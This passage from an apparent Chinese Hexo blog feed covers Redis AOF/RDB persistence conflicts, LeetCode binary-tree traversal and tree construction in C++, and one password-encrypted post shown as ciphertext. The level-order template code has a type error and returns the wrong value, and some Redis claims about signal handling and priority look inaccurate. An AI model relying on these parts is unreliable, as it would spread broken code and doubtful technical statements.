title="AOF重写和RDB持久化的冲突"></a>AOF重写和RDB持久化的冲突</h4><p>在Redis中，AOF重写和RDB持久化可能会同时发生，这会导致一些冲突和问题。例如：</p><ul><li>AOF重写和RDB持久化都需要fork子进程，如果两个子进程同时存在，会增加内存的消耗和系统的负载。</li><li>AOF重写和RDB持久化都需要写入磁盘，如果两个文件同时写入，会增加磁盘的压力和IO的开销。</li><li>AOF重写和RDB持久化都需要在完成后通知主进程，如果两个信号同时到达，可能会造成信号丢失或者处理错误。</li></ul><p>为了解决这些冲突和问题，Redis采用了以下策略：</p><ul><li><strong>如果AOF重写和RDB持久化同时被触发，那么只有一个子进程会被创建，优先执行RDB持久化，然后再执行AOF重写。</strong>这样可以避免同时存在两个子进程的情况。</li><li>如果AOF重写正在进行，而此时又收到了RDB持久化的请求，那么RDB持久化会被延迟到AOF重写完成后再执行。这样可以避免同时写入两个文件的情况。</li><li>如果AOF重写和RDB持久化都完成了，那么主进程会先处理RDB持久化的信号，然后再处理AOF重写的信号。这样可以避免信号丢失或者处理错误的情况。</li></ul><p>总之，Redis通过优先级、延迟和顺序等方式来协调AOF重写和RDB持久化的冲突和问题，保证了数据的完整性和一致性，下图为简要说明。</p><table><thead><tr><th>场景</th><th>策略</th></tr></thead><tbody><tr><td>AOF重写与RDB持久化同时被触发</td><td>优先RDB</td></tr><tr><td>AOF重写正在进行</td><td>优先AOF</td></tr><tr><td>AOF重写和RDB持久化都完成</td><td>优先RDB</td></tr></tbody></table><h3 id="三种模式的选择建议"><a href="#三种模式的选择建议" class="headerlink" title="三种模式的选择建议"></a>三种模式的选择建议</h3><p>具体的选择建议如下：</p><ul><li>如果对数据完整性要求不高，可以只使用RDB，或者将AOF的同步频率设置为每秒一次</li><li>如果想让数据尽可能不丢失，可以只使用AOF，并将AOF的同步频率设置为每次写入操作都同步</li><li>如果对数据完整性和性能都有要求，可以同时使用AOF和RDB，并将AOF的同步频率设置为每秒一次。这样既可以保证数据的安全性，又可以利用RDB进行快速的数据恢复</li><li>如果既想节省磁盘空间，又想提高数据恢复速度，可以只使用RDB，并适当调整RDB的快照频率</li></ul><h2 id="Redis内存淘汰机制"><a href="#Redis内存淘汰机制" class="headerlink" title="Redis内存淘汰机制"></a>Redis内存淘汰机制</h2>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>后端开发</tag>
      
      <tag>Redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>leetcode117复习二叉树的层序遍历</title>
    <link href="/2024/06/05/leetcode117%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/"/>
    <url>/2024/06/05/leetcode117%E5%A4%8D%E4%B9%A0%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E5%B1%82%E5%BA%8F%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<p>刷到了leetcode117，通过层序遍历做出来的，顺便就复习一下二叉树的层序遍历。</p><span id="more"></span><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/">题目链接</a></p><p>根据题意，我们需要将每个节点的<code>next</code>指针指向在树中这个节点右边的那个节点，所以很显然，这道题是层序遍历节点，在某一层中，才能找到树中某个节点的右边节点。</p><p>可以写出如下代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">// Definition for a Node.</span><br><span class="hljs-comment">class Node {</span><br><span class="hljs-comment">public:</span><br><span class="hljs-comment">    int val;</span><br><span class="hljs-comment">    Node* left;</span><br><span class="hljs-comment">    Node* right;</span><br><span class="hljs-comment">    Node* next;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node() : val(0), left(NULL), right(NULL), next(NULL) {}</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val) : val(_val), left(NULL), right(NULL), next(NULL) {}</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Node(int _val, Node* _left, Node* _right, Node* _next)</span><br><span class="hljs-comment">        : val(_val), left(_left), right(_right), next(_next) {}</span><br><span class="hljs-comment">};</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">connect</span><span class="hljs-params">(Node* root)</span> </span>{<br>        queue&lt;Node*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>)<br>            que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-comment">// 层序遍历</span><br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>())<br>        {<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i)<br>            {<br>                Node* node = que.<span class="hljs-built_in">front</span>();<br>                que.<span class="hljs-built_in">pop</span>();<br>                <span class="hljs-keyword">if</span> ( i == size - <span class="hljs-number">1</span>)<span class="hljs-comment">//该层最后一个节点</span><br>                {<br>                    node-&gt;next=<span class="hljs-literal">NULL</span>;<br>                }<br>                <span class="hljs-keyword">else</span><br>                {<br>                    <span class="hljs-comment">// 将next指针指向右边的节点</span><br>                    node-&gt;next = que.<span class="hljs-built_in">front</span>();<br>                }<br>                <span class="hljs-keyword">if</span> (node-&gt;left!=<span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(node-&gt;left);<br>                <span class="hljs-keyword">if</span> (node-&gt;right!=<span class="hljs-literal">NULL</span>) que.<span class="hljs-built_in">push</span>(node-&gt;right);<br>            }<br>        }<br>        <span class="hljs-keyword">return</span> root;<br>    }<br>};<br></code></pre></td></tr></table></figure><h3 id="记录一下二叉树层序遍历的板子"><a href="#记录一下二叉树层序遍历的板子" class="headerlink" title="记录一下二叉树层序遍历的板子"></a>记录一下二叉树层序遍历的板子</h3><p>二叉树的层序遍历通过队列实现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">Node* <span class="hljs-title">solution</span><span class="hljs-params">(Node* root)</span> </span>{<br>        queue&lt;Node*&gt; que;<br>        <span class="hljs-keyword">if</span> (root != <span class="hljs-literal">NULL</span>)<br>            que.<span class="hljs-built_in">push</span>(root);<br>        <span class="hljs-comment">// 存放层序遍历结果</span><br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; result;<br>        <span class="hljs-comment">// 层序遍历</span><br>        <span class="hljs-keyword">while</span>(!que.<span class="hljs-built_in">empty</span>())<br>        {<br>            <span class="hljs-type">int</span> size = que.<span class="hljs-built_in">size</span>();<br>            vector&lt;<span class="hljs-type">int</span>&gt; temp;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i)<br>            {<br>                Node* t = que.<span class="hljs-built_in">front</span>();<br>                <span class="hljs-keyword">if</span> (t-&gt;left) que.<span class="hljs-built_in">push</span>(t-&gt;left);<br>                <span class="hljs-keyword">if</span> (t-&gt;right) que.<span class="hljs-built_in">push</span>(t-&gt;right);<br>                que.<span class="hljs-built_in">pop</span>();<br>                temp.<span class="hljs-built_in">push_back</span>(t);<br>            }<br>            result.<span class="hljs-built_in">push_back</span>(temp);<br>        }<br>        <span class="hljs-keyword">return</span> root;<br>    }<br>};<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>通过数组构造树</title>
    <link href="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/"/>
    <url>/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>通过前序遍历数组(后序遍历数组)和中序遍历数组构造树的方法😀</p><span id="more"></span><h3 id="前序遍历-中序遍历构造"><a href="#前序遍历-中序遍历构造" class="headerlink" title="前序遍历+中序遍历构造"></a>前序遍历+中序遍历构造</h3><p>本题为leetcode-105</p><p>在前序遍历中，我们可以知道顺序为：中、左、右</p><p>在中序遍历中，我们可以知道顺序为：左、中、右</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">preorder = [<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>];<br>inorder = [<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>如上两个数组，我们可以发现前序数组的第一个元素3就是根节点的数据，那么根据这个根节点的数据，我们可以在中序数组中分割出两个子数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorderLeft = [<span class="hljs-number">9</span>];<br>inorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>接着，我们发现在前序数组中，不能直接分割出后面的左右两部分，需要借助分割出的中序数组来帮助我们分割前序数组，即通过新的两个中序数组的大小，我们可以在前序数组中找出左右子树的区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">preorderLeft = [<span class="hljs-number">9</span>];<br>preorderRight = [<span class="hljs-number">20</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>然后递归左子树和右子树即可。</p><p>完整代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode {</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}</span><br><span class="hljs-comment"> * };</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; preorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder)</span> </span>{<br>        <span class="hljs-comment">// 先序遍历的为空说明所有节点已经遍历完成</span><br>        <span class="hljs-keyword">if</span> (preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>){<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        }<br>        <span class="hljs-comment">// 取先序数组的第一个元素作为根节点</span><br>        <span class="hljs-type">int</span> value = preorder[<span class="hljs-number">0</span>];<br>        TreeNode * ansTree = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>        <span class="hljs-keyword">if</span> (preorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">1</span>)<br>        {<br>            <span class="hljs-comment">// 叶子节点</span><br>            <span class="hljs-keyword">return</span> ansTree;<br>        }<br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (; index &lt; preorder.<span class="hljs-built_in">size</span>() ; ++index){<br>            <span class="hljs-keyword">if</span> (inorder[index] == value) <span class="hljs-keyword">break</span>;<br>        }<br>        <span class="hljs-comment">// 切割中序数组,左闭右开</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() , inorder.<span class="hljs-built_in">begin</span>() + index);<br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>,inorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 通过切割出来的中序数组大小去切割先序数组,左闭右开</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; preorderLeft = <span class="hljs-built_in">vector</span>(preorder.<span class="hljs-built_in">begin</span>() + <span class="hljs-number">1</span>, preorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>        vector&lt;<span class="hljs-type">int</span>&gt; preorderRight = <span class="hljs-built_in">vector</span>(preorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>,preorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 通过新的数组构建子树</span><br>        ansTree-&gt;left = <span class="hljs-built_in">buildTree</span>(preorderLeft,inorderLeft);<br>        ansTree-&gt;right = <span class="hljs-built_in">buildTree</span>(preorderRight,inorderRight);<br>        <span class="hljs-keyword">return</span> ansTree;<br>    }<br>};<br></code></pre></td></tr></table></figure><img src="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/Snipaste_2024-06-01_14-33-35.png" class=""><h3 id="后序遍历-中序遍历构造"><a href="#后序遍历-中序遍历构造" class="headerlink" title="后序遍历+中序遍历构造"></a>后序遍历+中序遍历构造</h3><p>本题为leetcode-106</p><p>在后序遍历中，我们可以知道顺序为：左、右、中</p><p>在中序遍历中，我们可以知道顺序为：左、中、右</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorder = [<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br>postorder = [<span class="hljs-number">9</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>,<span class="hljs-number">3</span>]<br></code></pre></td></tr></table></figure><p>如上两个数组，我们可以发现后序数组的最后一个元素3就是根节点的数据，那么根据这个根节点的数据，我们可以在中序数组中分割出两个子数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">inorderLeft = [<span class="hljs-number">9</span>];<br>inorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">20</span>,<span class="hljs-number">7</span>];<br></code></pre></td></tr></table></figure><p>接着，我们发现在后序数组中，不能直接分割出前面的左右两部分，需要借助分割出的中序数组来帮助我们分割后序数组，即通过新的两个中序数组的大小，我们可以在后序数组中找出左右子树的区间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">postorderLeft = [<span class="hljs-number">9</span>];<br>postorderRight = [<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">20</span>];<br></code></pre></td></tr></table></figure><p>然后递归左子树和右子树即可。</p><p>完整代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * struct TreeNode {</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode *left;</span><br><span class="hljs-comment"> *     TreeNode *right;</span><br><span class="hljs-comment"> *     TreeNode() : val(0), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x) : val(x), left(nullptr), right(nullptr) {}</span><br><span class="hljs-comment"> *     TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {}</span><br><span class="hljs-comment"> * };</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> {<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>{<br>        <span class="hljs-keyword">if</span> (postorder.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>)<br>        {<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        }<br>        <span class="hljs-type">int</span> value = postorder[postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>];<br>        TreeNode * ansTree = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(value);<br>        <span class="hljs-comment">// 找到中序数组分割点</span><br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> ( ; index &lt; inorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; ++index)<br>        {<br>            <span class="hljs-keyword">if</span> ( inorder[index] == value ) <span class="hljs-keyword">break</span>;<br>        }<br>        <span class="hljs-comment">// 分割中序数组</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>(), inorder.<span class="hljs-built_in">begin</span>() + index);<br>        vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>, inorder.<span class="hljs-built_in">end</span>());<br>        <span class="hljs-comment">// 分割后序数组</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; postorderLeft = <span class="hljs-built_in">vector</span>(postorder.<span class="hljs-built_in">begin</span>() ,postorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>());<br>        vector&lt;<span class="hljs-type">int</span>&gt; postorderRight = <span class="hljs-built_in">vector</span>(postorder.<span class="hljs-built_in">begin</span>() + inorderLeft.<span class="hljs-built_in">size</span>() , postorder.<span class="hljs-built_in">end</span>() - <span class="hljs-number">1</span>);<br>        ansTree-&gt;left = <span class="hljs-built_in">buildTree</span>(inorderLeft,postorderLeft);<br>        ansTree-&gt;right = <span class="hljs-built_in">buildTree</span>(inorderRight,postorderRight);<br>        <span class="hljs-keyword">return</span> ansTree;<br>    }<br>};<br></code></pre></td></tr></table></figure><h3 id="编码细节"><a href="#编码细节" class="headerlink" title="编码细节"></a>编码细节</h3><p>在分割区间时，必须要同一格式，这里我采用的是左闭右开形式。对于vector数组在构造时，是默认左闭右开构造的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"> <span class="hljs-comment">// 分割中序数组</span><br>vector&lt;<span class="hljs-type">int</span>&gt; inorderLeft = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>(), inorder.<span class="hljs-built_in">begin</span>() + index); <span class="hljs-comment">// 不包含inroder.begin() + index</span><br>vector&lt;<span class="hljs-type">int</span>&gt; inorderRight = <span class="hljs-built_in">vector</span>(inorder.<span class="hljs-built_in">begin</span>() + index + <span class="hljs-number">1</span>, inorder.<span class="hljs-built_in">end</span>());<span class="hljs-comment">// 不包含inorder.end()</span><br></code></pre></td></tr></table></figure><h3 id="前序数组和后序数组不能完成构造"><a href="#前序数组和后序数组不能完成构造" class="headerlink" title="前序数组和后序数组不能完成构造"></a>前序数组和后序数组不能完成构造</h3><p>没有中序遍历无法确定左右部分，也就是无法分割。</p><img src="/2024/06/01/%E9%80%9A%E8%BF%87%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0%E6%A0%91/Snipaste_2024-06-01_14-43-07.png" class=""><p>tree1 的前序遍历是[1 2 3]， 后序遍历是[3 2 1]。</p><p>tree2 的前序遍历是[1 2 3]， 后序遍历是[3 2 1]。</p><p>那么tree1 和 tree2 的前序和后序完全相同，这是一棵树么，很明显是两棵树！</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
    <tags>
      
      <tag>算法</tag>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软工课设开发实录</title>
    <link href="/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/"/>
    <url>/2024/04/25/%E8%BD%AF%E5%B7%A5%E8%AF%BE%E8%AE%BE%E5%BC%80%E5%8F%91%E5%AE%9E%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="88009ec9c456ad66f57a72f3e14de5cf64669c7b7a0d6ba7d8370f0ca2fe6b37">80f7af2430a3dce6996ee26d1569b238df7a00ba178a284f7450c5191b6cba1b22ce39a260168d14f4269dcde61726af205b4636f874ace751710e635fc65e2e3aece16dca678fb447577b623431d45fc1d28de245c7a91a3e59bb3f6449d71dde30162f90d208abc6ed9e3cfb514b8c4afc1c6175090522fb561a99ac2cb8f42f7c8765ad2861c4b1dd11433bbd8450faebcb140ff29f1e89d84cef2a12be0c48cae50fcba07b2beee132de4f02422721cadef8a3b80ed6be53a502d068d35211eeb2428911bc3ff7f651641e8a5c40627847287978b8dd3baf6c9c4b55907d3438bdf699457f58dacaae33232d6d702cdb63d5d22c44728b68f2a2d0f6a48ffb2330eef88912f438565a2b30f2ffccf09f151944f7f9d531cc4f7a952dd8304e261144ad9ffba8fc9d23f4e586f2fb83e37abf13044edbb1595c011f6ac62c8e3b48d66c65413e26be03fac0fea860175da01098780e1b1d48c95298112ef1f79859191911d149be1bc9169c0609cf31e99509fdafa34e1a1714e5811dde6a4b82118fe5bbbbdb0db21be7232539141e4e805544d3d4219f17d40b21a5dbcdc112698d8a6e3d8709d173c3e43347f3758251626d05b6df761bba3e710dbfc11cdc4cc13caa5adf543e6473e9dd30115dc1451fe4623040d76fbb528b589961046b5258bbea1b0c998c830bdd548de3dcea6462ed07c9970fe06f531bfcab09befa11b634efd72a75554e031a198ea087019edf3cb067e1e0786b5572a426b45cdb5809a7186047f31bfb6e68e127e7f0be3156648bcb544156de89f37d5d5452d1f6ff0c7fa584fc61f02fadbb7a9f686ded956f47a1e1669fdc5d8fe02b4867aae5ead42a9961215da6fdd72bf55ea7ccfa00f124c4d0b3ab25de3d5aab44db4f4d8ebb39b079e012128e6a8db6fc4d7de0ea30514bade354977cc45c79f9eb92cef455a9e709c8e8585a6f39a864ffdd212469524adf373c5ad92d43e7f01780739b7f6bce176c7047fe02b981f4c7e975ff3807ba19c5d068294e87cdef0a177a68886954edea68f43d8da8424f6c2dd22e43b950e68b5d91598e1a720b53e17c586e429b2748f17fdb36209d68ae68bb6c238d418892206160e547c4cc8efe2c3380d34af49f8267e7bd2c301f0f807b9aeccfbac42b4869d8a22483a6269369e40ec8a9d61064be9f1493c929534ccf39b5ce78480ff423b6a374e22d1e50fc5fd21d2bc97e506a516e3a4e5f2a7811c6a3ce00bebd18346fe280e90354ebb89a52be113d8a66ab1589de762c2f8b85715ebbc9e2108e631fa279e8664950b97255f2b85e56d234e235d33f3e38a61ab8dd52f78769525f81440415f21c654758123f080106518c8f3826696c68b4e539bf946fedfc3ec420031e5a9ffbcc8c5583f972bea618ba33abc417e40aca0e599007338b92dddca7323cc997090bbbd3207e2bca0acd335d00efee01d1d2e5dd31d584a79f8a6888c5f7ba2afdc7351f8317a777b0956f3606cc48d011dea518b009ada6feae9119d195b93d7b8e14426d15c2b7f1e50b1c6b49cc01be25936e69e7e2de322e194942e6ceb173ebc98f78c86d8ab25727d177b6b4ccfcfb51f0eb49559cdb3773d6a5c3f0f4203f04bd9327b0bd4e320f6282fe2868555bc2712a74754eac97abcbc19313bdcbb1872b7fbc7fa917978463bf96634de4f7bda436b05f08d75edfba037372706ab5dd83b68b0e888905f73d155601d6ca9f5d962f2b79e6225de65ae0031679d1a8b25120f225d68b2178f000c86aa5fec42fed75d7735a8fe65fab92272385b6ef079a21192820d022751d5489f62304231308bc36b749ab66b5c89543c6e704cd70153211212a8c06dd234e3dbcaac1c747ca6740d9de063d22f074b9a124eb48f14aeb1fc0b2af59abf2a786f9669bf7efb85823b0b49d14a152ec180cee0a985f1be6c4434b1ebc4acfc7d534f5b2f11ac5b64fbd6001236fe64ecad00dd15197ce2a9a9c610d4e3e438be94da199a3aaccf33cc359e2fa07428579088da7fc9c30d8d0ed6e35332bc541877101b8b23dd04ad4646d5802700446c01afc10aba925a3bb32f896b2e8c03da9abb831968574a650d9f57740fd9fb0a612da7e5d034caf9d94c4ac7a7a3674c1b3f42a9af49751ccb1b0c6d9373f5749d26db28512a90abb86b19440b745c8c862ce4a661a1e180f9662a3619391a089aae78b88b65c2c8b1f720e029135c4f7ad84e906c0b547345847ab08753fe3ca94d9038d5f3f4c730b0da568902a20e4212914b97160e98c9b8265eab1523c651469cc47c51eebff4a3042ff62ac005c1da65e16e8f04a515d8f6bed3205b23fc4f46a0fb9ef189446c07355f5eb14dd25e7136c61361b7244e1f4e1afea98b6daf1bb61f8ddc152e69164317ae7e788115a7f442c9124b0af3733e939fe4adede5fa9555cef061635b486d30c2b4b074863422d14dc7fc0f085070eb92c90d4316f9db3a76